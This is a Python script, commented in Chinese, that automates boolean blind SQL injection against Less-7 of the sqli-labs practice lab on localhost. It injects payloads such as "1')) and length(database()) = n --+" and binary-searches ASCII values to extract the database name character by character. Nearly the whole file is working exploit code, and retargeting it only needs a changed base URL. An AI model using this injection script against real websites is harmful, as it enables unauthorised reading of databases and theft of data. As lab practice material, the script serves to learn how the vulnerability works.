#sqllibs-7 布尔盲注脚本
import requests
from urllib.parse import quote
flag = "You are in...."
baseurl = "http://127.0.0.1:8888/sqli-labs/Less-7/?id="
headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
#获取数据库长度
def getdbsLength():
    global flag, baseurl, headers
    l=1
    while(1):
        id="1')) and length(database()) = " + str(l)
        url=baseurl + quote(id) #quote为url编码函数
        url1= url+ " --+" #注释符号不能编码 + 编码成%2B注释符会失效
        print(url)
        response = requests.get(url1,headers=headers).text
        if(flag not in response):
            print("数据库名长度不为",l,"继续测试" )
            l=l+1
        else:
            print("数据库名的长度为",l,"success")
            break
    return l

def getdbsname(l):
#查询结果由一个个字符组成，每一个字符有95种可能性（大小写字母、数字、特殊符号），对应的ASCLL编码是32~126
    global flag,baseurl,header
    database = ""
    for i in range(1,l+1):
       z=31
       y=127
       while(1):
            asciinum = (z+y) // 2
            print(asciinum)
            id= "1')) and ascii(substr(database(),"+str(i)+",1)) =" + str(asciinum)
            zs=" --+"
            urlx=baseurl + quote(id) + zs
            response = requests.get(urlx ,headers=headers).text
            if(flag in response):
                database += chr(asciinum)
                print("数据库名正在猜解中",database)
                break
            else:
                id = "1')) and ascii(substr(database(),"+str(i)+",1)) > " + str(asciinum)
                zs=" --+"
                urlq=baseurl + quote(id) + zs
                print(urlq)
                response = requests.get(baseurl + quote(id) + zs,headers=headers).text
                if(flag in response):
                    z = asciinum + 1
                else:
                    y= asciinum - 1
    print("数据库名猜解成功！！！",database)
    return database

getdbsname(8)
getdbsLength()






